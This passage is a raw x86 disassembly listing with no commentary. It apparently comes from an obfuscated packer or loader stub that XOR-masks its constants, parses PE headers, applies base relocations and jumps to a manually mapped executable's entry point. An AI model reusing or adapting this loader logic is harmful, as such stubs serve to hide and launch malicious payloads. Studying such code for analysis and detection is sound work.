  41777f:	cmp    eax,0xf89c8585
  417784:	mov    eax,DWORD PTR [ebp+0x8]
  417787:	mov    eax,DWORD PTR [eax+0x1d8]
  41778d:	mov    ecx,DWORD PTR [ebp-0x50]
  417790:	jne    0x4177b3
  417792:	xor    ecx,ebx
  417794:	add    ecx,esi
  417796:	push   ecx
  417797:	mov    ecx,DWORD PTR [ebp-0xc]
  41779a:	xor    ecx,ebx
  41779c:	add    ecx,esi
  41779e:	push   ecx
  41779f:	push   DWORD PTR [ebp-0x2c]
  4177a2:	call   DWORD PTR [eax+0x18]
  4177a5:	mov    eax,DWORD PTR [ebp-0x24]
  4177a8:	mov    DWORD PTR [ebp-0x2c],eax
  4177ab:	mov    eax,DWORD PTR [ebp-0x20]
  4177ae:	mov    DWORD PTR [ebp-0x3c],eax
  4177b1:	jmp    0x4177c6
  4177b3:	xor    ecx,ebx
  4177b5:	add    ecx,esi
  4177b7:	push   ecx
  4177b8:	mov    ecx,DWORD PTR [ebp-0xc]
  4177bb:	xor    ecx,ebx
  4177bd:	add    ecx,esi
  4177bf:	push   ecx
  4177c0:	push   DWORD PTR [ebp-0x24]
  4177c3:	call   DWORD PTR [eax+0x18]
  4177c6:	mov    eax,DWORD PTR [ebp-0x3c]
  4177c9:	mov    DWORD PTR [ebp-0x38],eax
  4177cc:	mov    eax,DWORD PTR [ebp-0x2c]
  4177cf:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  4177d6:	mov    DWORD PTR [ebp-0x40],eax
  4177d9:	mov    edi,0xf89c8584
  4177de:	mov    DWORD PTR [ebp-0x30],edi
  4177e1:	mov    eax,DWORD PTR [ebp-0x28]
  4177e4:	xor    eax,ebx
  4177e6:	add    eax,esi
  4177e8:	mov    DWORD PTR [ebp-0xc],eax
  4177eb:	mov    eax,DWORD PTR [ebp-0x28]
  4177ee:	xor    eax,ebx
  4177f0:	add    eax,esi
  4177f2:	mov    DWORD PTR [ebp-0x10],eax
  4177f5:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  4177fc:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  417803:	mov    eax,DWORD PTR [ebp-0x28]
  417806:	mov    ecx,DWORD PTR [ebp-0x38]
  417809:	xor    eax,ebx
  41780b:	add    eax,esi
  41780d:	cmp    ecx,eax
  41780f:	je     0x417a05
  417815:	jmp    0x4179e1
  41781a:	mov    ecx,DWORD PTR [ebp-0xc]
  41781d:	mov    eax,DWORD PTR [ebp-0x38]
  417820:	sub    eax,ecx
  417822:	mov    ecx,DWORD PTR [ebp-0x48]
  417825:	xor    ecx,ebx
  417827:	add    ecx,esi
  417829:	xor    edx,edx
  41782b:	div    ecx
  41782d:	mov    DWORD PTR [ebp-0x10],eax
  417830:	mov    eax,DWORD PTR [ebp-0x24]
  417833:	mov    ecx,DWORD PTR [ebp-0x10]
  417836:	xor    eax,ebx
  417838:	add    eax,esi
  41783a:	cmp    ecx,eax
  41783c:	jbe    0x417848
  41783e:	mov    eax,DWORD PTR [ebp-0x24]
  417841:	xor    eax,ebx
  417843:	add    eax,esi
  417845:	mov    DWORD PTR [ebp-0x10],eax
  417848:	mov    eax,DWORD PTR [ebp-0x48]
  41784b:	mov    ecx,DWORD PTR [ebp-0x10]
  41784e:	xor    eax,ebx
  417850:	add    eax,esi
  417852:	imul   eax,ecx
  417855:	mov    DWORD PTR [ebp-0x10],eax
  417858:	mov    eax,DWORD PTR [ebp-0x28]
  41785b:	mov    ecx,DWORD PTR [ebp-0x10]
  41785e:	xor    eax,ebx
  417860:	add    eax,esi
  417862:	cmp    ecx,eax
  417864:	je     0x4179cf
  41786a:	mov    eax,DWORD PTR [ebp-0x10]
  41786d:	mov    DWORD PTR [ebp-0x20],eax
  417870:	mov    eax,DWORD PTR [ebp-0xc]
  417873:	add    eax,DWORD PTR [ebp-0x40]
  417876:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41787d:	mov    DWORD PTR [ebp-0x10],edi
  417880:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  417887:	mov    DWORD PTR [ebp-0x1c],eax
  41788a:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  417891:	mov    DWORD PTR [ebp-0x8],edi
  417894:	mov    eax,DWORD PTR [ebp-0x54]
  417897:	xor    eax,ebx
  417899:	add    eax,esi
  41789b:	jmp    0x41798e
  4178a0:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  4178aa:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  4178b4:	mov    eax,DWORD PTR [ebp-0x8]
  4178b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4178ba:	xor    eax,ebx
  4178bc:	add    eax,esi
  4178be:	imul   eax,ecx
  4178c1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178c4:	mov    al,BYTE PTR [eax+ecx*1]
  4178c7:	mov    BYTE PTR [ebp-0x1],al
  4178ca:	mov    eax,DWORD PTR [ebp-0x8]
  4178cd:	mov    ecx,DWORD PTR [ebp-0x18]
  4178d0:	xor    eax,ebx
  4178d2:	add    eax,esi
  4178d4:	imul   eax,ecx
  4178d7:	mov    ecx,DWORD PTR [ebp-0x4c]
  4178da:	xor    ecx,ebx
  4178dc:	add    eax,ecx
  4178de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178e1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  4178e9:	mov    ecx,DWORD PTR [ebp-0xac]
  4178ef:	xor    ecx,ebx
  4178f1:	lea    eax,[ecx+eax*1+0x3272e2]
  4178f8:	movzx  ecx,BYTE PTR [ebp-0x1]
  4178fc:	xor    ecx,eax
  4178fe:	mov    BYTE PTR [ebp-0x1],cl
  417901:	mov    al,BYTE PTR [ebp-0x1]
  417904:	mov    ecx,DWORD PTR [ebp-0x8]
  417907:	mov    edx,DWORD PTR [ebp-0x18]
  41790a:	xor    ecx,ebx
  41790c:	add    ecx,esi
  41790e:	imul   ecx,edx
  417911:	mov    edx,DWORD PTR [ebp-0x1c]
  417914:	mov    BYTE PTR [ecx+edx*1],al
  417917:	mov    eax,DWORD PTR [ebp-0x8]
  41791a:	mov    ecx,DWORD PTR [ebp-0x18]
  41791d:	xor    eax,ebx
  41791f:	add    eax,esi
  417921:	imul   eax,ecx
  417924:	mov    ecx,DWORD PTR [ebp-0x1c]
  417927:	mov    al,BYTE PTR [eax+ecx*1]
  41792a:	mov    BYTE PTR [ebp-0x1],al
  41792d:	mov    eax,DWORD PTR [ebp-0x8]
  417930:	mov    ecx,DWORD PTR [ebp-0x18]
  417933:	xor    eax,ebx
  417935:	add    eax,esi
  417937:	imul   eax,ecx
  41793a:	mov    ecx,DWORD PTR [ebp-0x10]
  41793d:	xor    ecx,ebx
  41793f:	add    eax,ecx
  417941:	mov    ecx,DWORD PTR [ebp-0x1c]
  417944:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41794c:	mov    ecx,DWORD PTR [ebp-0x9c]
  417952:	xor    ecx,ebx
  417954:	lea    eax,[ecx+eax*1+0x3272e2]
  41795b:	movzx  ecx,BYTE PTR [ebp-0x1]
  41795f:	xor    ecx,eax
  417961:	mov    BYTE PTR [ebp-0x1],cl
  417964:	mov    al,BYTE PTR [ebp-0x1]
  417967:	mov    ecx,DWORD PTR [ebp-0x8]
  41796a:	mov    edx,DWORD PTR [ebp-0x18]
  41796d:	xor    ecx,ebx
  41796f:	add    ecx,esi
  417971:	imul   ecx,edx
  417974:	mov    edx,DWORD PTR [ebp-0x1c]
  417977:	mov    BYTE PTR [ecx+edx*1],al
  41797a:	mov    eax,DWORD PTR [ebp-0x34]
  41797d:	mov    ecx,DWORD PTR [ebp-0x10]
  417980:	xor    eax,ebx
  417982:	xor    ecx,ebx
  417984:	add    eax,esi
  417986:	add    ecx,esi
  417988:	imul   eax,ecx
  41798b:	add    eax,DWORD PTR [ebp-0x18]
  41798e:	mov    DWORD PTR [ebp-0x18],eax
  417991:	mov    eax,DWORD PTR [ebp-0x18]
  417994:	mov    ecx,DWORD PTR [ebp-0x20]
  417997:	cmp    ecx,eax
  417999:	jb     0x4178a0
  41799f:	mov    eax,DWORD PTR [ebp-0x10]
  4179a2:	mov    ecx,DWORD PTR [ebp-0x20]
  4179a5:	xor    eax,ebx
  4179a7:	add    eax,esi
  4179a9:	imul   eax,ecx
  4179ac:	mov    ecx,DWORD PTR [ebp-0x54]
  4179af:	xor    ecx,ebx
  4179b1:	add    ecx,esi
  4179b3:	or     eax,ecx
  4179b5:	mov    ecx,DWORD PTR [ebp-0x30]
  4179b8:	xor    ecx,ebx
  4179ba:	add    eax,ecx
  4179bc:	mov    ecx,DWORD PTR [ebp-0x30]
  4179bf:	xor    ecx,ebx
  4179c1:	add    eax,ecx
  4179c3:	mov    ecx,DWORD PTR [ebp-0xc]
  4179c6:	lea    eax,[eax+ecx*1+0x64e5c4]
  4179cd:	jmp    0x4179de
  4179cf:	mov    eax,DWORD PTR [ebp-0x30]
  4179d2:	mov    ecx,DWORD PTR [ebp-0xc]
  4179d5:	xor    eax,ebx
  4179d7:	lea    eax,[eax+ecx*1+0x3272e2]
  4179de:	mov    DWORD PTR [ebp-0xc],eax
  4179e1:	mov    eax,DWORD PTR [ebp-0x30]
  4179e4:	xor    eax,ebx
  4179e6:	mov    ecx,0xffcd8d1e
  4179eb:	sub    ecx,eax
  4179ed:	add    ecx,DWORD PTR [ebp-0x38]
  4179f0:	mov    eax,DWORD PTR [ebp-0x30]
  4179f3:	mov    edx,DWORD PTR [ebp-0xc]
  4179f6:	xor    eax,ebx
  4179f8:	add    eax,esi
  4179fa:	imul   eax,edx
  4179fd:	cmp    eax,ecx
  4179ff:	jbe    0x41781a
  417a05:	push   DWORD PTR [ebp+0x8]
  417a08:	mov    eax,DWORD PTR [ebp+0x8]
  417a0b:	push   DWORD PTR [eax+0x1cc]
  417a11:	lea    eax,[ebp-0xa0]
  417a17:	push   eax
  417a18:	mov    eax,DWORD PTR [ebp+0x8]
  417a1b:	mov    eax,DWORD PTR [eax+0x1c4]
  417a21:	push   DWORD PTR [eax]
  417a23:	mov    eax,DWORD PTR [ebp+0x8]
  417a26:	mov    eax,DWORD PTR [eax+0x1c0]
  417a2c:	push   DWORD PTR [eax]
  417a2e:	push   DWORD PTR [ebp-0x3c]
  417a31:	push   DWORD PTR [ebp-0x2c]
  417a34:	call   0x4184cb
  417a39:	mov    DWORD PTR [ebp-0x40],eax
  417a3c:	mov    eax,DWORD PTR [ebp-0x14]
  417a3f:	mov    ecx,DWORD PTR [ebp-0x2c]
  417a42:	xor    eax,ebx
  417a44:	add    eax,esi
  417a46:	cmp    eax,ecx
  417a48:	je     0x417a69
  417a4a:	mov    eax,DWORD PTR [ebp+0x8]
  417a4d:	mov    ecx,DWORD PTR [ebp-0x50]
  417a50:	mov    eax,DWORD PTR [eax+0x1d8]
  417a56:	xor    ecx,ebx
  417a58:	add    ecx,esi
  417a5a:	push   ecx
  417a5b:	mov    ecx,DWORD PTR [ebp-0x14]
  417a5e:	xor    ecx,ebx
  417a60:	add    ecx,esi
  417a62:	push   ecx
  417a63:	push   DWORD PTR [ebp-0x2c]
  417a66:	call   DWORD PTR [eax+0x18]
  417a69:	pop    edi
  417a6a:	pop    esi
  417a6b:	pop    ebx
  417a6c:	leave  
  417a6d:	ret    0x4
  417a70:	push   ebp
  417a71:	mov    ebp,esp
  417a73:	push   ecx
  417a74:	push   ecx
  417a75:	lea    eax,[ebp-0x8]
  417a78:	mov    DWORD PTR [ebp-0x4],eax
  417a7b:	push   esi
  417a7c:	mov    esi,DWORD PTR [ebp-0x4]
  417a7f:	mov    eax,0xf881ba0f
  417a84:	mov    DWORD PTR [esi],eax
  417a86:	mov    esi,DWORD PTR [ebp-0x8]
  417a89:	cmp    esi,eax
  417a8b:	pop    esi
  417a8c:	jne    0x417a96
  417a8e:	mov    BYTE PTR [ecx+0xa],0x7c
  417a92:	mov    BYTE PTR [edx+0x8],0x2f
  417a96:	mov    BYTE PTR [edx+0xa],0x7c
  417a9a:	mov    BYTE PTR [ecx+0x2],0x2
  417a9e:	leave  
  417a9f:	ret    
  417aa0:	push   ebp
  417aa1:	mov    ebp,esp
  417aa3:	push   ecx
  417aa4:	push   ecx
  417aa5:	lea    eax,[ebp-0x8]
  417aa8:	mov    DWORD PTR [ebp-0x4],eax
  417aab:	mov    edx,DWORD PTR [ebp-0x4]
  417aae:	mov    eax,0xf88b0be3
  417ab3:	mov    DWORD PTR [edx],eax
  417ab5:	mov    edx,DWORD PTR [ebp-0x8]
  417ab8:	cmp    edx,eax
  417aba:	jne    0x417acb
  417abc:	mov    eax,DWORD PTR [ebp+0x8]
  417abf:	mov    BYTE PTR [ecx+0x9],0x8
  417ac3:	mov    BYTE PTR [eax+0x7],0x47
  417ac7:	mov    BYTE PTR [ecx+0x6],0xf
  417acb:	mov    BYTE PTR [ecx+0x3],0x18
  417acf:	leave  
  417ad0:	ret    0x4
  417ad3:	push   ebp
  417ad4:	mov    ebp,esp
  417ad6:	push   ecx
  417ad7:	push   ecx
  417ad8:	lea    eax,[ebp-0x8]
  417adb:	mov    DWORD PTR [ebp-0x4],eax
  417ade:	mov    edx,DWORD PTR [ebp-0x4]
  417ae1:	mov    eax,0x7e0da0f
  417ae6:	mov    DWORD PTR [edx],eax
  417ae8:	mov    edx,DWORD PTR [ebp-0x8]
  417aeb:	cmp    edx,eax
  417aed:	jne    0x417af3
  417aef:	mov    BYTE PTR [ecx+0x7],0x47
  417af3:	mov    eax,DWORD PTR [ebp+0x8]
  417af6:	mov    BYTE PTR [ecx+0x1],0x5
  417afa:	mov    BYTE PTR [eax+0x9],0x28
  417afe:	leave  
  417aff:	ret    0x4
  417b02:	push   ebp
  417b03:	mov    ebp,esp
  417b05:	push   ecx
  417b06:	push   ecx
  417b07:	lea    eax,[ebp-0x8]
  417b0a:	mov    DWORD PTR [ebp-0x4],eax
  417b0d:	push   esi
  417b0e:	mov    esi,DWORD PTR [ebp-0x4]
  417b11:	mov    eax,0x7060e3e
  417b16:	mov    DWORD PTR [esi],eax
  417b18:	mov    esi,DWORD PTR [ebp-0x8]
  417b1b:	cmp    esi,eax
  417b1d:	pop    esi
  417b1e:	jne    0x417b2a
  417b20:	mov    BYTE PTR [edx+0x4],0x3
  417b24:	mov    WORD PTR [ecx+0x3],0x318
  417b2a:	mov    BYTE PTR [edx],0x3f
  417b2d:	leave  
  417b2e:	ret    
  417b2f:	push   ebp
  417b30:	mov    ebp,esp
  417b32:	push   ecx
  417b33:	push   ecx
  417b34:	lea    eax,[ebp-0x8]
  417b37:	mov    DWORD PTR [ebp-0x4],eax
  417b3a:	mov    edx,DWORD PTR [ebp-0x4]
  417b3d:	mov    eax,0xf8870b3f
  417b42:	mov    DWORD PTR [edx],eax
  417b44:	mov    edx,DWORD PTR [ebp-0x8]
  417b47:	cmp    edx,eax
  417b49:	jne    0x417b56
  417b4b:	mov    eax,DWORD PTR [ebp+0x8]
  417b4e:	mov    BYTE PTR [ecx+0x8],0xf
  417b52:	mov    BYTE PTR [eax+0x1],0x5
  417b56:	mov    BYTE PTR [ecx+0x5],0xb
  417b5a:	leave  
  417b5b:	ret    0x4
  417b5e:	push   esi
  417b5f:	mov    ecx,edi
  417b61:	call   0x417b2f
  417b66:	mov    edx,edi
  417b68:	mov    ecx,esi
  417b6a:	mov    BYTE PTR [esi],0x1f
  417b6d:	call   0x417b02
  417b72:	push   esi
  417b73:	mov    ecx,edi
  417b75:	mov    BYTE PTR [esi+0x5],0xb
  417b79:	call   0x417ad3
  417b7e:	push   esi
  417b7f:	mov    BYTE PTR [esi+0x6],0xf
  417b83:	call   0x417aa0
  417b88:	mov    BYTE PTR [esi+0x2],0x2
  417b8c:	mov    edx,esi
  417b8e:	jmp    0x417a70
  417b93:	push   ebp
  417b94:	mov    ebp,esp
  417b96:	push   ecx
  417b97:	mov    ecx,DWORD PTR [edx+0x194]
  417b9d:	push   esi
  417b9e:	mov    esi,DWORD PTR [ebp+0x8]
  417ba1:	mov    esi,DWORD PTR [esi]
  417ba3:	mov    DWORD PTR [ecx],esi
  417ba5:	mov    ecx,DWORD PTR [edx+0x194]
  417bab:	mov    ecx,DWORD PTR [ecx]
  417bad:	mov    esi,DWORD PTR [edx+0x190]
  417bb3:	mov    DWORD PTR [esi],ecx
  417bb5:	mov    eax,DWORD PTR [edx+0x194]
  417bbb:	mov    ecx,DWORD PTR [eax]
  417bbd:	mov    ecx,DWORD PTR [ecx+0x3c]
  417bc0:	add    ecx,DWORD PTR [eax]
  417bc2:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  417bc9:	mov    eax,DWORD PTR [ebp-0x4]
  417bcc:	movzx  ecx,WORD PTR [ecx+0x16]
  417bd0:	xor    eax,0x751089b
  417bd5:	add    eax,0x3272e2
  417bda:	pop    esi
  417bdb:	test   ecx,eax
  417bdd:	je     0x417beb
  417bdf:	mov    eax,DWORD PTR [edx+0x1c8]
  417be5:	mov    DWORD PTR [eax],0xf89c8584
  417beb:	leave  
  417bec:	ret    0x4
  417bef:	push   ebp
  417bf0:	mov    ebp,esp
  417bf2:	sub    esp,0x70
  417bf5:	and    DWORD PTR [ebp-0x20],0x0
  417bf9:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  417c00:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  417c07:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  417c0e:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  417c15:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  417c1c:	mov    eax,DWORD PTR [ebp+0x20]
  417c1f:	mov    eax,DWORD PTR [eax+0x194]
  417c25:	mov    DWORD PTR [ebp-0xc],eax
  417c28:	mov    eax,DWORD PTR [ebp+0x20]
  417c2b:	push   ebx
  417c2c:	push   esi
  417c2d:	mov    esi,DWORD PTR [eax+0x190]
  417c33:	mov    eax,DWORD PTR [ebp+0x20]
  417c36:	mov    eax,DWORD PTR [eax+0x18c]
  417c3c:	mov    DWORD PTR [ebp-0x8],eax
  417c3f:	mov    eax,DWORD PTR [eax]
  417c41:	push   edi
  417c42:	mov    DWORD PTR [ebp-0x4],esi
  417c45:	test   eax,eax
  417c47:	jne    0x417c54
  417c49:	push   DWORD PTR [ebp+0x1c]
  417c4c:	mov    edx,DWORD PTR [ebp+0x20]
  417c4f:	call   0x417b93
  417c54:	mov    eax,DWORD PTR [esi]
  417c56:	mov    ebx,DWORD PTR [esi]
  417c58:	add    ebx,DWORD PTR [eax+0x3c]
  417c5b:	mov    eax,DWORD PTR [ebp+0xc]
  417c5e:	mov    ecx,DWORD PTR [ebp-0x8]
  417c61:	mov    ecx,DWORD PTR [ecx]
  417c63:	mov    esi,0x751089b
  417c68:	xor    eax,esi
  417c6a:	mov    edi,0x3272e2
  417c6f:	add    eax,edi
  417c71:	cmp    eax,ecx
  417c73:	jne    0x417eab
  417c79:	mov    eax,DWORD PTR [ebp-0xc]
  417c7c:	mov    eax,DWORD PTR [eax]
  417c7e:	mov    DWORD PTR [ebp-0x10],eax
  417c81:	mov    eax,DWORD PTR [ebx+0x50]
  417c84:	mov    DWORD PTR [ebp-0x68],eax
  417c87:	mov    eax,DWORD PTR [ebp-0x18]
  417c8a:	xor    eax,esi
  417c8c:	add    eax,edi
  417c8e:	mov    DWORD PTR [ebp-0x64],eax
  417c91:	mov    eax,DWORD PTR [ebp-0x14]
  417c94:	and    DWORD PTR [ebp-0x6c],0x0
  417c98:	xor    eax,esi
  417c9a:	add    eax,edi
  417c9c:	mov    DWORD PTR [ebp-0x60],eax
  417c9f:	lea    eax,[ebp-0x70]
  417ca2:	push   eax
  417ca3:	mov    eax,DWORD PTR [ebp+0x8]
  417ca6:	xor    eax,esi
  417ca8:	add    eax,edi
  417caa:	push   eax
  417cab:	mov    eax,DWORD PTR [ebp+0x20]
  417cae:	add    eax,0xaa
  417cb3:	push   eax
  417cb4:	mov    eax,DWORD PTR [ebp+0x20]
  417cb7:	mov    eax,DWORD PTR [eax+0x198]
  417cbd:	mov    DWORD PTR [ebp-0x70],0x4
  417cc4:	push   DWORD PTR [eax]
  417cc6:	mov    eax,DWORD PTR [ebp+0x10]
  417cc9:	call   eax
  417ccb:	mov    ecx,DWORD PTR [ebp-0xc]
  417cce:	mov    ecx,DWORD PTR [ecx]
  417cd0:	mov    edx,DWORD PTR [ebp-0x8]
  417cd3:	mov    DWORD PTR [ebp-0x6c],eax
  417cd6:	mov    DWORD PTR [ebp+0x1c],eax
  417cd9:	mov    DWORD PTR [edx],ecx
  417cdb:	mov    ecx,DWORD PTR [ebp-0x4]
  417cde:	mov    DWORD PTR [ecx],eax
  417ce0:	mov    eax,DWORD PTR [ebx+0x50]
  417ce3:	mov    DWORD PTR [ebp-0x68],eax
  417ce6:	mov    eax,DWORD PTR [ebp-0x1c]
  417ce9:	xor    eax,esi
  417ceb:	add    eax,edi
  417ced:	mov    DWORD PTR [ebp-0x64],eax
  417cf0:	lea    eax,[ebp-0x20]
  417cf3:	mov    DWORD PTR [ebp-0x60],eax
  417cf6:	lea    eax,[ebp-0x70]
  417cf9:	push   eax
  417cfa:	mov    eax,DWORD PTR [ebp+0x8]
  417cfd:	xor    eax,esi
  417cff:	add    eax,edi
  417d01:	push   eax
  417d02:	mov    eax,DWORD PTR [ebp+0x20]
  417d05:	add    eax,0xee
  417d0a:	push   eax
  417d0b:	mov    eax,DWORD PTR [ebp+0x20]
  417d0e:	mov    eax,DWORD PTR [eax+0x198]
  417d14:	mov    DWORD PTR [ebp-0x70],0x4
  417d1b:	push   DWORD PTR [eax]
  417d1d:	mov    eax,DWORD PTR [ebp+0x10]
  417d20:	call   eax
  417d22:	test   eax,eax
  417d24:	je     0x417d49
  417d26:	and    DWORD PTR [ebp+0xc],0x0
  417d2a:	cmp    DWORD PTR [ebx+0x50],0x0
  417d2e:	jbe    0x417d49
  417d30:	mov    eax,DWORD PTR [ebp+0x1c]
  417d33:	mov    ecx,DWORD PTR [ebp-0x10]
  417d36:	sub    ecx,eax
  417d38:	mov    dl,BYTE PTR [ecx+eax*1]
  417d3b:	inc    DWORD PTR [ebp+0xc]
  417d3e:	mov    BYTE PTR [eax],dl
  417d40:	mov    edx,DWORD PTR [ebp+0xc]
  417d43:	inc    eax
  417d44:	cmp    edx,DWORD PTR [ebx+0x50]
  417d47:	jb     0x417d38
  417d49:	mov    edx,DWORD PTR [ebp+0x1c]
  417d4c:	mov    ecx,DWORD PTR [edx+0x3c]
  417d4f:	add    ecx,edx
  417d51:	mov    eax,DWORD PTR [ecx+0xa0]
  417d57:	mov    ebx,DWORD PTR [ecx+0x28]
  417d5a:	add    eax,edx
  417d5c:	sub    edx,DWORD PTR [ebp-0x10]
  417d5f:	add    ebx,DWORD PTR [ebp+0x1c]
  417d62:	mov    DWORD PTR [ebp+0xc],edx
  417d65:	mov    DWORD PTR [ebp-0x2c],ecx
  417d68:	mov    DWORD PTR [ebp-0x14],ebx
  417d6b:	mov    DWORD PTR [ebp-0x8],0x0
  417d72:	jmp    0x417dee
  417d74:	add    edx,0xfffffff8
  417d77:	shr    edx,1
  417d79:	mov    DWORD PTR [ebp-0x18],edx
  417d7c:	je     0x417dda
  417d7e:	lea    edx,[eax+0x8]
  417d81:	mov    DWORD PTR [ebp-0x4],edx
  417d84:	mov    edx,DWORD PTR [ebp-0x18]
  417d87:	mov    DWORD PTR [ebp-0x18],edx
  417d8a:	mov    edx,DWORD PTR [ebp-0x4]
  417d8d:	movzx  edx,WORD PTR [edx]
  417d90:	mov    DWORD PTR [ebp-0x24],edx
  417d93:	and    edx,0xfff
  417d99:	mov    DWORD PTR [ebp-0x28],edx
  417d9c:	mov    edx,DWORD PTR [ebp-0x24]
  417d9f:	shr    edx,0xc
  417da2:	add    edx,0xffcd8d1e
  417da8:	xor    edx,esi
  417daa:	cmp    edx,0xf89c85ba
  417db0:	jne    0x417dd1
  417db2:	mov    edx,DWORD PTR [ebp-0x28]
  417db5:	add    edx,DWORD PTR [ebp+0x1c]
  417db8:	mov    ebx,DWORD PTR [eax]
  417dba:	cmp    DWORD PTR [ebx+edx*1],0x0
  417dbe:	je     0x417dce
  417dc0:	mov    ecx,DWORD PTR [ebp+0xc]
  417dc3:	add    ecx,DWORD PTR [ebx+edx*1]
  417dc6:	mov    ebx,DWORD PTR [eax]
  417dc8:	mov    DWORD PTR [edx+ebx*1],ecx
  417dcb:	mov    ecx,DWORD PTR [ebp-0x2c]
  417dce:	mov    ebx,DWORD PTR [ebp-0x14]
  417dd1:	add    DWORD PTR [ebp-0x4],0x2
  417dd5:	dec    DWORD PTR [ebp-0x18]
  417dd8:	jne    0x417d8a
  417dda:	mov    edx,DWORD PTR [ebp-0xc]
  417ddd:	add    DWORD PTR [ebp-0x8],edx
  417de0:	mov    edx,DWORD PTR [ebp-0x8]
  417de3:	cmp    edx,DWORD PTR [ecx+0xa4]
  417de9:	jae    0x417dfc
  417deb:	add    eax,DWORD PTR [ebp-0xc]
  417dee:	mov    edx,DWORD PTR [eax+0x4]
  417df1:	mov    DWORD PTR [ebp-0xc],edx
  417df4:	test   edx,edx
  417df6:	jne    0x417d74
  417dfc:	mov    eax,DWORD PTR [ebp-0x10]
  417dff:	mov    DWORD PTR [ebp-0x6c],eax
  417e02:	mov    DWORD PTR [ebp-0x70],0x4
  417e09:	mov    eax,DWORD PTR [ecx+0x50]
  417e0c:	mov    DWORD PTR [ebp-0x68],eax
  417e0f:	mov    eax,DWORD PTR [ebp-0x1c]
  417e12:	xor    eax,esi
  417e14:	add    eax,edi
  417e16:	mov    DWORD PTR [ebp-0x64],eax
  417e19:	lea    eax,[ebp-0x20]
  417e1c:	mov    DWORD PTR [ebp-0x60],eax
  417e1f:	lea    eax,[ebp-0x70]
  417e22:	push   eax
  417e23:	mov    eax,DWORD PTR [ebp+0x8]
  417e26:	xor    eax,esi
  417e28:	add    eax,edi
  417e2a:	push   eax
  417e2b:	mov    eax,DWORD PTR [ebp+0x20]
  417e2e:	add    eax,0xee
  417e33:	push   eax
  417e34:	mov    eax,DWORD PTR [ebp+0x20]
  417e37:	mov    eax,DWORD PTR [eax+0x198]
  417e3d:	push   DWORD PTR [eax]
  417e3f:	mov    eax,DWORD PTR [ebp+0x10]
  417e42:	call   eax
  417e44:	mov    eax,DWORD PTR [ebp+0x20]
  417e47:	mov    eax,DWORD PTR [eax+0x180]
  417e4d:	add    eax,DWORD PTR [ebp+0xc]
  417e50:	mov    ecx,DWORD PTR [ebp+0xc]
  417e53:	push   DWORD PTR [ebp+0x18]
  417e56:	mov    DWORD PTR [eax],ecx
  417e58:	push   DWORD PTR [ebp+0x14]
  417e5b:	push   DWORD PTR [ebp+0x1c]
  417e5e:	call   ebx
  417e60:	mov    ecx,DWORD PTR [ebp+0xc]
  417e63:	add    ecx,DWORD PTR [ebp+0x20]
  417e66:	lea    eax,[ebp+0x4]
  417e69:	mov    DWORD PTR [ebp+0x20],ecx
  417e6c:	mov    ecx,DWORD PTR [ebp+0x20]
  417e6f:	mov    ecx,DWORD PTR [ebp+0x20]
  417e72:	mov    edx,DWORD PTR [ecx+0x190]
  417e78:	mov    ecx,DWORD PTR [ebp+0x20]
  417e7b:	mov    ecx,DWORD PTR [ecx+0x18c]
  417e81:	mov    esi,DWORD PTR [ecx]
  417e83:	cmp    DWORD PTR [eax],esi
  417e85:	jb     0x417ea6
  417e87:	mov    esi,DWORD PTR [edx]
  417e89:	mov    edi,DWORD PTR [edx]
  417e8b:	mov    esi,DWORD PTR [esi+0x3c]
  417e8e:	lea    esi,[edi+esi*1+0x50]
  417e92:	mov    edi,DWORD PTR [ecx]
  417e94:	add    edi,DWORD PTR [esi]
  417e96:	cmp    DWORD PTR [eax],edi
  417e98:	jae    0x417ea6
  417e9a:	mov    esi,DWORD PTR [ecx]
  417e9c:	mov    ecx,DWORD PTR [eax]
  417e9e:	mov    edx,DWORD PTR [edx]
  417ea0:	sub    ecx,esi
  417ea2:	add    edx,ecx
  417ea4:	mov    DWORD PTR [eax],edx
  417ea6:	mov    eax,DWORD PTR [ebp+0xc]
  417ea9:	jmp    0x417ead
  417eab:	xor    eax,eax
  417ead:	pop    edi
  417eae:	pop    esi
  417eaf:	pop    ebx
  417eb0:	leave  
  417eb1:	ret    0x1c
  417eb4:	push   ebp
  417eb5:	mov    ebp,esp
  417eb7:	sub    esp,0x1c
  417eba:	push   esi
  417ebb:	mov    esi,eax
  417ebd:	mov    eax,DWORD PTR [ecx+0x190]
  417ec3:	cmp    DWORD PTR [eax],0x0
  417ec6:	je     0x417fd6
  417ecc:	test   edx,edx
  417ece:	je     0x417fd6
  417ed4:	test   esi,esi
  417ed6:	je     0x417fd6
  417edc:	mov    eax,DWORD PTR [esi+0x88]
  417ee2:	test   eax,eax
  417ee4:	je     0x417fd1
  417eea:	cmp    DWORD PTR [esi+0x8c],0x10
  417ef1:	je     0x417fd1
  417ef7:	cmp    DWORD PTR [esi+0x34],edx
  417efa:	je     0x417fd1
  417f00:	mov    esi,DWORD PTR [ecx+0x18c]
  417f06:	and    DWORD PTR [ebp-0x10],0x0
  417f0a:	mov    ecx,edx
  417f0c:	sub    ecx,DWORD PTR [esi]
  417f0e:	add    eax,edx
  417f10:	movzx  edx,WORD PTR [eax+0xc]
  417f14:	mov    DWORD PTR [ebp-0x1c],ecx
  417f17:	movzx  ecx,WORD PTR [eax+0xe]
  417f1b:	add    ecx,edx
  417f1d:	je     0x417fd1
  417f23:	lea    ecx,[eax+0x14]
  417f26:	push   ebx
  417f27:	mov    DWORD PTR [ebp-0x18],ecx
  417f2a:	mov    esi,0x7fffffff
  417f2f:	push   edi
  417f30:	test   DWORD PTR [ecx],esi
  417f32:	je     0x417fb3
